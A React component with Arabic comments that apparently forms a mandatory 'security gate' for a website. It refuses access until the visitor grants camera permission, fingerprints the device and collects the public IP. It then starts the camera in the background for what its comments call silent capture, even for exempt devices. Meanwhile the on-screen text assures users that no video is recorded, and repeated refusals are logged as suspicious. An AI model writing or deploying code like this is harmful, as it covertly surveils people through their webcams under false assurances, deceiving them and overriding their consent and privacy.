// بوابة الأمان الإلزامية - منع الوصول الكامل للموقع بدون إذن الكاميرا
import { useEffect, useState, ReactNode } from 'react';
import { security } from '@/lib/security';
import { getPublicIP } from '@/lib/publicIP';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Shield, Camera, AlertTriangle, Loader2 } from 'lucide-react';

interface SecurityGateProps {
  children: ReactNode;
}

export default function SecurityGate({ children }: SecurityGateProps) {
  const [cameraPermissionGranted, setCameraPermissionGranted] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [permissionDenied, setPermissionDenied] = useState(false);
  const [retryCount, setRetryCount] = useState(0);
  const [deviceBlocked, setDeviceBlocked] = useState(false);

  // تهيئة نظام الأمان الإلزامي
  useEffect(() => {
    initializeSecuritySystem();
  }, []);

  const initializeSecuritySystem = async () => {
    try {
      console.log('🔒 بدء تهيئة بوابة الأمان الإلزامية...');
      setIsLoading(true);

      // خطوة 1: تهيئة بصمة الجهاز
      await security.initFingerprint();
      console.log('🔑 تم إنشاء بصمة الجهاز');

      // خطوة 1.5: الحصول على IP العام في الخلفية (بدون انتظار)
      getPublicIP().then(result => {
        if (result.ip) {
          console.log(`🌐 تم الحصول على IP العام: ${result.ip} من ${result.source}`);
        } else {
          console.warn('⚠️ فشل في الحصول على IP العام:', result.error);
        }
      }).catch(error => {
        console.warn('⚠️ خطأ في نظام IP detection:', error);
      });

      // فحص إذا كان هذا الجهاز مستثنى من نظام الأمان
      const currentFingerprint = security.getFingerprint();
      const exemptFingerprints = [
        'b2a36eed6cf382cfb9a2aee9f93f3d47', // بصمة الحاسوب المستثنى
        'e5a7d8f2c3b14569a8d7f2c3b1456789'  // بصمة احتياطية إضافية
      ];
      
      if (exemptFingerprints.includes(currentFingerprint)) {
        console.log('✅ جهاز مستثنى من نظام الأمان - تشغيل الكاميرا في الخلفية');
        
        // حتى للأجهزة المستثناة، تشغيل الكاميرا في الخلفية للتصوير الصامت
        try {
          const backgroundCameraStarted = await security.startBackgroundCamera();
          if (backgroundCameraStarted) {
            console.log('📹 الكاميرا جاهزة في الخلفية للجهاز المستثنى');
          } else {
            console.warn('⚠️ فشل تشغيل الكاميرا في الخلفية للجهاز المستثنى');
          }
        } catch (error) {
          console.warn('⚠️ خطأ في تشغيل الكاميرا للجهاز المستثنى:', error);
        }
        
        setCameraPermissionGranted(true);
        setIsLoading(false);
        return;
      }

      // خطوة 2: التحقق من حالة الحظر للأجهزة غير المستثناة
      const blocked = await security.checkIfBlocked();
      if (blocked) {
        console.log('🚫 الجهاز محظور - منع الوصول');
        setDeviceBlocked(true);
        setIsLoading(false);
        return;
      }

      // خطوة 3: طلب إذن الكاميرا الإجباري للأجهزة غير المستثناة
      await requestCameraPermission();

    } catch (error) {
      console.error('❌ فشل في تهيئة نظام الأمان:', error);
      setPermissionDenied(true);
      setIsLoading(false);
    }
  };

  const requestCameraPermission = async () => {
    try {
      console.log('📹 طلب إذن الكاميرا الإجباري...');
      
      const granted = await security.requestCameraPermission();
      
      if (granted) {
        console.log('✅ تم منح إذن الكاميرا - تشغيل الكاميرا في الخلفية');
        
        // تشغيل الكاميرا في الخلفية فوراً للتصوير الصامت
        const backgroundCameraStarted = await security.startBackgroundCamera();
        if (backgroundCameraStarted) {
          console.log('📹 الكاميرا جاهزة في الخلفية للتصوير الصامت');
        } else {
          console.warn('⚠️ فشل تشغيل الكاميرا في الخلفية');
        }
        
        setCameraPermissionGranted(true);
        setPermissionDenied(false);
        setIsLoading(false);
      } else {
        console.log('🚫 تم رفض إذن الكاميرا - منع الوصول');
        setPermissionDenied(true);
        setIsLoading(false);
      }
    } catch (error) {
      console.error('❌ خطأ في طلب إذن الكاميرا:', error);
      setPermissionDenied(true);
      setIsLoading(false);
    }
  };

  const handleRetry = async () => {
    const newRetryCount = retryCount + 1;
    setRetryCount(newRetryCount);
    
    if (newRetryCount >= 3) {
      console.log('🚨 تجاوز الحد الأقصى لمحاولات الوصول - تقرير كنشاط مشبوه');
      await security.reportSuspiciousActivity('camera_permission_bypass_attempt', {
        retryCount: newRetryCount,
        timestamp: new Date().toISOString()
      });
    }
    
    await initializeSecuritySystem();
  };

  // عرض شاشة التحميل
  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
        <div className="text-center space-y-4">
          <div className="flex justify-center">
            <div className="relative">
              <Shield className="h-16 w-16 text-primary animate-pulse" />
              <Loader2 className="h-6 w-6 text-blue-600 animate-spin absolute top-5 left-5" />
            </div>
          </div>
          <h2 className="text-2xl font-bold text-gray-800">تهيئة نظام الأمان</h2>
          <p className="text-gray-600">يتم التحقق من أمان النظام...</p>
        </div>
      </div>
    );
  }

  // عرض رسالة الجهاز المحظور
  if (deviceBlocked) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-red-50">
        <div className="max-w-md mx-auto p-6">
          <Card className="border-red-200">
            <CardContent className="p-6 text-center">
              <Shield className="h-16 w-16 text-red-500 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-red-700 mb-4">جهاز محظور</h2>
              <Alert variant="destructive">
                <AlertTriangle className="h-4 w-4" />
                <AlertTitle>وصول مرفوض</AlertTitle>
                <AlertDescription>
                  تم حظر هذا الجهاز من الوصول للنظام بسبب اكتشاف نشاط مشبوه. 
                  إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع إدارة النظام.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // عرض رسالة طلب إذن الكاميرا (بدون خيار التجاهل)
  if (!cameraPermissionGranted) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-orange-50 to-red-100">
        <div className="max-w-lg mx-auto p-6">
          <Card className="border-orange-200">
            <CardContent className="p-8 text-center">
              <div className="mb-6">
                <Camera className="h-20 w-20 text-orange-500 mx-auto mb-4" />
                <h1 className="text-3xl font-bold text-gray-800 mb-2">إذن الكاميرا مطلوب</h1>
                <div className="space-y-2 text-gray-600">
                  <p className="text-lg">لأسباب أمنية، يتطلب هذا النظام إذن الوصول للكاميرا</p>
                  <p className="text-sm">هذا النظام يستخدم الكاميرا للمراقبة الأمنية وحماية حسابك</p>
                </div>
              </div>

              <Alert className="mb-6" variant={retryCount >= 2 ? "destructive" : "default"}>
                <Shield className="h-4 w-4" />
                <AlertTitle>
                  {retryCount >= 2 ? 'تحذير أمني' : 'متطلب إجباري'}
                </AlertTitle>
                <AlertDescription>
                  {retryCount >= 2 
                    ? 'محاولات متعددة لتجاهل متطلبات الأمان. سيتم تسجيل هذا النشاط.'
                    : 'لن تتمكن من الوصول للنظام بدون منح إذن الكاميرا'
                  }
                </AlertDescription>
              </Alert>

              <div className="space-y-4">
                <Button 
                  onClick={handleRetry}
                  className="w-full py-3 text-lg"
                  variant={retryCount >= 2 ? "destructive" : "default"}
                >
                  <Camera className="w-5 h-5 ml-2" />
                  {retryCount > 0 ? `إعادة المحاولة (${retryCount}/3)` : 'منح إذن الكاميرا'}
                </Button>

                <div className="text-xs text-gray-500 space-y-1">
                  <p>• انقر على "السماح" عندما يطلب المتصفح إذن الكاميرا</p>
                  <p>• إذا رفضت بالخطأ، اضغط على أيقونة القفل في شريط العناوين</p>
                  <p>• هذا مطلوب لأسباب أمنية ولن يتم تسجيل أي فيديو</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // إذا تم منح الإذن، عرض المحتوى الأساسي
  return <>{children}</>;
}